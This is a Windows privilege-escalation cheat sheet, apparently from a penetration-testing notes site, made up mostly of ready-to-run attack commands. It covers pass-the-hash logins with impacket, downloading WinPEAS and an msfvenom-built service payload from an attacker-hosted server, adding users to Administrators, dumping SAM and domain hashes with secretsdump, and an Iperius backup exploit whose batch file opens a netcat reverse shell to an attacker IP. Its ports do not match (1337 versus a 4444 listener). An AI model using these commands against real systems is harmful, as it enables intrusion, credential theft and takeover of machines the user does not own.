---
title: Windows Privilege Escalation
description: Privilege Escalation (PrivEsc) in Windows is a process that get the Administrator credential and login.
tags:
    - Active Directory
    - Privilege Escalation
    - Windows
refs:
date: 2023-02-08
draft: false
---

## Connect from Linux to Windows Shell

If we have the credentials of Windows target, we can connect the target using psexec.

```sh
impacket-psexec username:password@<target-ip>
# Pass the Hashes
impacket-psexec -hashes abcdef0123456789abcdef0123456789:c2597747aa5e43022a3a3049a3c3b09d username@10.0.0.1

impacket-wmiexec example.local/username@10.0.0.1
# Pass the Hashes
impacket-wmiexec -hashes abcdef0123456789abcdef0123456789:c2597747aa5e43022a3a3049a3c3b09d example.local/username@10.0.0.1
```

<br />

## Automated Scanning

**[WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)** scans the Local Privilege Escalation vulnerabilities on Windows machine automatically.  

### 1. Download WinPEAS on Your Local Machine

```sh
wget https://github.com/carlospolop/PEASS-ng/releases/download/20220710/winPEAS.bat
```

Start web server to allow the target machine to get the WinPEAS.

```sh
python3 -m http.server 8000
```

### 2. Transfer WinPEAS using PowerShell on the Target Machine

```powershell
cd \Users\<user-name>\Desktop
powershell

Invoke-WebRequest -Uri http://<your-local-ip>:8000/winPEAS.bat -OutFile .\winPEAS.bat
# or
curl http://<your-local-ip>:8000/winPEAS.bat -o .\winPEAS.bat
```

### 3. Execute WinPEAS

```powershell
.\winPEAS.bat
```

<br />

## Investigation

### OS Information

```powershell
hostname
systeminfo
systeminfo | findstr "OS"
ver

# Current user
whoami
whoami /user
whoami /groups
whoami /priv
whoami /all
echo %username%

# List users and groups
net users
net user USERNAME
net localgroup

# Network
ipconfig
ipconfig /all
print route
arp -A

# Firewall
netsh firewall show state
netsh firewall show config
netsh advfirewall show allprofiles
```

### Recent Files

1. Right-click on the Windows icon.
2. Click the “Run”.
3. Type “recent” in the search form.

### Running Services

Using **the Windows Management Instrumentation command-line (WMIC)** mainly.

```powershell
wmic service list
wmic service list | findstr "Backup"
wmic service list | findstr "Iperius"  # Iperius is a backup service

# List all Unquoted Service Paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\" | findstr /i /v """                              "
# Get target process info
wmic process get processid,parentprocessid,executablepath | find "<process-id>"

# Get users SID
wmic useraccount get name,sid

# Launch the hidden executable hiding within ADS
wmic process call create $(Resolve-Path .\file.exe:streamname)


# Processes and services
sc query state=all
tasklist /svc

# Query the configuration info for a specified service
sc qc "Development Service"
```

### Histories

- **Web Browser History (Internet Explorer)**
    1. Open Internet Explorer, click on the star icon.
    2. Select History tab.

- **Command History in PowerShell Console**

    ```powershell
    type c:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
    ```

### VSS (Volume Shadow Copy Service)

VSS coordinates the actions that  are required to create a consistent a shadow copy (also known as a snapshot or a point-in-time copy) of the data that is to be backed up.

```powershell
vssadmin
vssadmin list shadows
vssadmin list volumes
```

### Sensitive Contents

```powershell
# /s: Searches the current directory and all subdirectories.
# /i: Ignores the case of the characters.
findstr /si password *.txt *.xml *.ini
findstr /si password c:\Users\Administrator\*.txt
findstr /si cred *.txt *.xml *.ini
findstr /si cred c:\Users\Administrator\*.txt

# /p: Skips files with non-printable characters.
# /n: Prints the line number of each line that matches.
findstr /spin "password" *.*
findstr /spin "password" c:\Users\Administrator\*

# List files
# /a: Displays only the names of those directories and files.
dir /a \Users\Administrator\Desktop
# /s: Lists every oncurrece of the specified file name within the specified directory and all subdirectories.
dir /s *pass* == *cred* == *vnc* == *.config*
# /q: Displays the ownership information.
dir /q \Users\Administrator\Desktop

# Get contents of file
more .\example.txt
type .\example.txt

# Registry subkey information
# query: Returns a list of the next tier of subkeys and entries that are located under a specified subkey in the registry
# HKLM: The keyname of HKEY_LOCAL_MACHINE
# /f: Specifies the data or pattern to search for.
# /t: Specifies registry types to search.
# /s: Specifies to query all subkeys and value names recursively.
reg query HKLM /f password /t REG_SZ /s

# Check Recycle.bin and SID Folder
cd \'$Recycle.Bin'
```

### Registry Keys

- **ShellBags**

    A set of registry keys that store details about a viewed folder, such as its size, position, and icon.

    1. **Location**

        ```txt
        c:\Users\<username>\AppData\Local\Microsoft\Windows\UsrClass.dat
        ``` 

        If you cannot found AppData folder in Explorer, click "View" tab and check "Hidden Items".

    2. **Access to Shellbag**

        1. Search "regedit" on search bar and open "Registry Editor"

        2. Go to "Computer\HKEY_CLASSES_ROOT\LocalSettings\Software\Microsoft\Windows\Shell\Bags"

    3. **ShellBags Explorer**

        Extract ShellBags information.

        1. Open "ShellBags Explorer"

        2. Select "File" -> "Load offline hive"

        3. Navigate to the UsrClass.dat and open the file

        4. Find suspicious folder and file

### .NET Decompiler

- **[ILSpy](https://github.com/icsharpcode/ILSpy)**

    .NET Decompiler with support for PDB generation, ReadyToRun, Metadata and more.

<br />

## Change File Permissions

1. Right-click on the file.
2. Select the Properties.
3. Click the Security tab.
4. Click “Advanced”
5. In the Permissions tab, click the “Add”
6. Click “Select a principal”
7. Enter the username in the text field.
8. Click OK and Apply.

<br />

## Useful Commands

1. **Refer to LOLBAS**

    1. **[LOLBAS](https://lolbas-project.github.io/#){:target="_blank"}{:rel="noopener"}**

    2. **Other Commands**

        ```powershell
        # Edit file
        notepad .\example.txt
        edit .\example.txt
        nano .\example.txt
        vim .\example.txt
        vi .\example.txt

        # Move file
        move .\example.txt ..\Desktop\

        # Change permission of a file
        icacls 'C:\Path\to\file' /grant Users:F
        icacls 'C:\Path\to\file' /grant Everyone:F

        # --------------------------------------------------

        # Restart machine

        shutdown /r /t 0
        ```

<br />

## Change Credentials to Root Privileges, Remote Users

If you can change the user's permissions, connect WinRM or RDP using "evil-winrm", "remmina".

```powershell
# Change user's password
net user USERNAME NEWPASSWORD

# Add new user
net user /add USERNAME PASSWORD

# Add user to group
net localgroup Administrators USERNAME /add
net localgroup "Remote Managment Users" USERNAME /add   # WinRM
net localgroup "Remote Desktop Users" USERNAME /add     # RDP
```

<br />

## Take Ownership of a File (Administrators Group Required)

```powershell
# Check if the current user belongs to the Administrators group. 
net user USERNAME

# Move to the directory containing the desired file
cd \Users\Administrator\Desktop

# Enable an administrator to recover access to a file.
# /R: recursive operation
# /F: specify the filename
takeown /r /f *.*

# Modify dictionary access control lists on specified files
# /q: suppress success message
# /c: continue the operation despite any file errors
# /t: perform the operation on all specified files
# /grant: grant specified user access rights
icacls "example.txt" /q /c /t /grant Users:F
```

<br />

## Dump Domain Password Hashes

The basic commands of secretsdump are below.

```sh
# Basic
impacket-secretsdump example.local/username:password@<target-ip>

# Only NTLM hashes and Kerberos keys
impacket-secretsdump -just-dc example.local/username:password@<target-ip>

# Only NTLM hashes
impacket-secretsdump -just-dc-ntlm example.local/username:password@<target-ip>

# NTDS and SYSTEM
impacket-secretsdump -ntds ntds.dit -system system LOCAL

# SAM, SECURITY, SYSTEM in local machine
impacket-secretsdump -sam sam.bak -security security.bak -system system.bak LOCAL
```

- **From Target Machine**

    To dump the hashes from the remote target machine, we need the Security Account Manager (SAM), SECURITY, SYSTEM hives.  
    First off, copy the three values of the registries somewhere we can access.

    ```bash
    # save: Saves a copy of specified subkeys, entries, and values of the registry in a specified file.
    reg save HKLM\sam c:\<the-directory-we-can-access>\sam.save
    reg save HKLM\security c:\<the-directory-we-can-access>\security.save
    reg save HKLM\system c:\<the-directory-we-can-access>\system.save
    ```

    Then download them to local machine and dump the hashes using `secretsdump`.

    ```sh
    impacket-secretsdump -sam ./sam.save -security ./security.save -system ./system.save LOCAL
    ```

    Now we can grab the NTLM hash for some users as follows:

    ```sh
    ...
    [+] Dumping local SAM hashes (uid:rid:lmhash:nthash)
    Administrator:500:abdc5435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
    Guest:501:dc83b435b51404eeaad3b435b51404ee:28587bf999828446a1c1209ddde4c450:::
    Mike:1000:e2a3b435b51404eeaad3b435b51404ee:7be87bf999828446a1c1209ddde4c450:::
    ...
    ```

    Crack them.

<br />

## Unquoteding Service Path to Privilege Escalation

```powershell

# In victim Windows machine

# Find unquoted service path
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\" | findstr /i /v """                                "

# Confirm the information for the service
sc qc "Development Service"

# If the service path is "C:\Program Files\Development Files\Devservice Files\Service.exe",
# you can place the exploit to "C:\Program Files\Devservice.exe"

# -----------------------------------------------------------------

# In attack machine

# Create the exploit using msfvenom
msfvenom -p windows/exec CMD='net localgroup Administrators victim-user /add' -f exe-service -o Devservice.exe

# Start local web server
python3 -m http.server 8000

# -------------------------------------------------------------

# In victim Windows machine

# Start PowerShell
powershell
# Wget
Invoke-WebRequest -Uri http://<attack-ip>:8000/Devservice.exe -OutFile .\Devservice.exe
# Move the exploit to the target path
mv .\Devservice.exe '\Program Files\Development Files\'

# Change permission of the exploit
icacls 'C:\Program Files\Development Files\Devservice.exe' /grant Everyone:F

# Restart
shutdown /r /t 0
# or PowerShell's command
Restart-Computer
```

<br />

## Applications

1. **Computer Management**

    You can find all local users.

    1. **Search and open "computer management"**

    2. **Click "Local Users and Groups"**

    - **Users**

        1. **Click "Users"**

        2. **Double-click each user to get details e.g. "Member Of"**

    - **Groups**

        1. **Click "Groups"**

        2. **Double-click each group**

        3. **Attempt to add new user in the group. In most cases, however, it should do as administrator.**

2. **Disk Management**

    Check partitions with it.

    1. **Open the 'Disk Management'**

    2. **Right click the partition to view the properties**

    3. **Check 'Security' tab or 'Shadow Copies' tab**

    - **Check Partition in Windows Explorer**

        1. Right click the partition and click 'Change Drive Letter and Paths'
        2. Open dialog.
        3. Click 'Add'. In the dropdown, choose a letter (ex. Z:) and click 'OK'.
        4. At the top, in the Volume column, you should see that the partition has a letter (Z:) assigned to.
        5. Open Windows Explorer and check if Z: exists on 'This PC'.
        6. Click the partition (Z:) and click 'View' tab at the top then check 'Hidden Items'.

    - **Restore the previous version of partition**

        1. Right click the partition and click 'Properties' -> 'Previous Versions'
        2. Select shadow copy you want to restore and click 'Restore'. The Confirmation popup open, then click 'Restore'.

3. **Event Viewer**

    It lets administrators and users view the event logs on a local or remote machine.

    1. Search and open "Event Viewer".

4. **FullEventLogview**

    - **Search Event Logs**

        1. Open "Advanced Options".

5. **Sysinternals**

    Tools that offer technical resources and utilities to manage, diagnose, troubleshoot, and monitor a Microsoft Windows environment.

    ```sh
    # Autoruns
    # It shows what programs are configured to run during system bootup or login.
    autoruns.exe

    # Process Explorer
    # A freeware task manager and system monitor.
    procexp.exe
    procexp64.exe

    # Process Monitor
    # It monitors and displays in real-time all file system activity.
    procmon.exe
    procmon64.exe

    # Strings
    # It is same as the Linux “strings” command.
    strings.exe example.exe | findstr "sometext"
    strings64.exe example.exe | findstr "sometext"
    ```

6. **Task Scheduler**

    Coming soon.

7. **Iperius Backup Service (Privilege Escalation)**

    Iperius is vulnerable to privilege escalation.

    1. **Check if Iperius is Running in Target Machine**

        ```sh
        wmic service list | findstr "Iperius"
        ```

    2. **Create a .bat file (ex. "exploit.bat") and place it to Desktop.**

        When saving, be sure to save it as the file type "All Files". (NOT Text Documents (*.txt))

        ```powershell
        @echo off
        C:\Users\<USERNAME>\Downloads\nc.exe <attack_machine_ip> 1337 -e exploit.exe
        ```

    3. **Open Listener in Local Machine**

        ```sh
        nc -lvnp 4444
        ```

    4. **Settings in Target Machine**

        1. Click "Iperius" icon in Windows Explorer (path: C:\Program Files (x86)\Iperius Backup\Iperius).
        2. Right click the "Iperius" icon on the right-bottom of the bar to open it.
        3. Click "Create New Backup" and select "Add Folder".
        4. Enter path (c:\Users\<USERNAME>\Documents) and click "OK".
        5. Navigate to "Destination" tab and select "Add Destination Folder".
        7. Enter path (c:\Users\<USERNAME>\Descktop) and click "OK".
        8. Navigate to "Other Processes" tab.
        9. On "Before backup" section, check "Run a program or open external file:" and select "exploit.bat" file.

        - **Run**
            On "Iperius Backup" window, right-click on backup jobs "Documents" and select "Run backup as service" then click "OK" on the dialog.

    5. **Check if Incoming Connection Established in Local Machine**
